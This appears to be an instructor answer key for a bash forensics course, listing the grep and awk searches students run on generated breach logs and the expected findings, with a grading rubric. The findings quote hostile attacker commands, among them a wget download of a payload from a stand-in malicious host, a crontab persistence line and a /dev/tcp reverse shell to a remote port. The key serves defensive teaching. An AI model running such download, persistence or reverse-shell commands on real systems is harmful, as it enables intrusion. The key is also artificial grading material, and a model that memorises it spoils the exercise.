# Lab Findings Answer Key

This key is the instructor answer set for all generated datasets.

## Scope

This key covers:

1. `setup_bash_cyber_lab.sh` default dataset under `$HOME/bash-cyber-course/logs`
2. `advanced_breach_generator.sh` output for all tiers (`intro`, `intermediate`, `advanced`, `final`)

Use this for grading, QA, and assistant-instructor alignment.

## Tier Notes

The attack story is intentionally consistent across all tiers. Background line count changes by tier, but the core attacker artifacts stay stable.

Tier usage guidance:

- Intro labs (Labs 1-4): `intro`
- Intermediate labs (Labs 5-6): `intermediate`
- Advanced labs (Lab 7): `advanced`
- Final challenge (Lab 8): `final`

## A. Expected Findings - Setup Dataset

Path assumptions:

- `logs/auth.log`
- `logs/access.log`
- `logs/bash_history.log`
- `logs/syslog`
- `logs/network.log`

### 1. Top attacker IP

```bash
grep "Failed password" logs/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr | head -n 1
```

Expected pattern:

- top IP: `185.220.101.4`
- failed-attempt count for this IP: `400`

### 2. Total failed logins

```bash
grep -c "Failed password" logs/auth.log
```

Expected value with current intro-sized setup: `80400`.

### 3. Compromised account

```bash
grep "Accepted password" logs/auth.log
```

Expected indicator:

- user: `admin`
- timestamp includes `Jul 10 09:16:10`

### 4. Session established

```bash
grep "session opened" logs/auth.log
```

Expected indicator:

- `session opened for user admin`

### 5. Suspicious download activity

```bash
grep -E "wget|curl" logs/bash_history.log
```

Expected indicator:

- `wget http://malicious.site/payload.sh`

### 6. Persistence evidence

```bash
grep -i "cron" logs/syslog
grep "crontab" logs/bash_history.log
```

Expected indicators:

- `CRON[1500]: (admin) CMD (wget http://malicious.site/payload.sh)`
- `echo '* * * * * /tmp/payload.sh' >> /etc/crontab`

### 7. Reverse shell and C2

```bash
grep "/dev/tcp" logs/bash_history.log
grep "45.77.88.2" logs/syslog
grep "45.77.88.2" logs/network.log
```

Expected indicators:

- reverse shell command to `45.77.88.2:4444`
- outbound network artifacts referencing `45.77.88.2`

### 8. Data targeting indicator

```bash
grep -E "backup.zip|/admin" logs/access.log
```

Expected indicators:

- `GET /admin`
- `GET /backup.zip`

### 9. Cleanup attempt

```bash
grep "history -c" logs/bash_history.log
grep "history cleared" logs/syslog
```

Expected indicator:

- history clear attempt appears in both files

### 10. Timeline anchors

```bash
grep -E "Accepted password|session opened" logs/auth.log
grep -E "CRON|outbound connection|history cleared" logs/syslog
grep "backup.zip" logs/access.log
```

Expected progression:

1. brute-force failures against `admin`
2. successful login
3. session opened
4. persistence activity
5. outbound suspicious connection
6. backup access
7. cleanup attempt

## B. Expected Findings - Advanced Generator (All Tiers)

### Intro Tier

Use for beginner exercises. All key attacker artifacts are present.

### Intermediate Tier

Use for pipeline repetition. Artifact set matches intro tier.

### Advanced Tier

Use for manual hunt and timeline labs. Artifact set includes privilege escalation and lateral movement clues.

### Final Tier

Use for capstone. Same core attacker story with higher background noise.

For all tiers, expected core artifacts:

1. top attacker IP remains `185.220.101.4`
2. brute-force stage contributes `450` targeted failures
3. compromised account is `admin`
4. persistence command is written to crontab
5. reverse shell callback references `45.77.88.2:4444`
6. lateral command references `ssh root@10.0.0.15`
7. web targeting includes `/admin` and `/backup.zip`

## C. Grading Key (Recommended)

Use this 10-point rubric for final submissions:

- 2 points: correct attacker IP
- 2 points: correct compromised account
- 2 points: correct malware or suspicious command
- 2 points: correct persistence indicator
- 2 points: coherent timeline with at least five events

## D. Known Variability Notes

- Noise data is randomized each run.
- Core attack artifacts are deterministic and should remain present.
- Top attacker should remain stable because injected attacker event count is much higher than random duplicates.
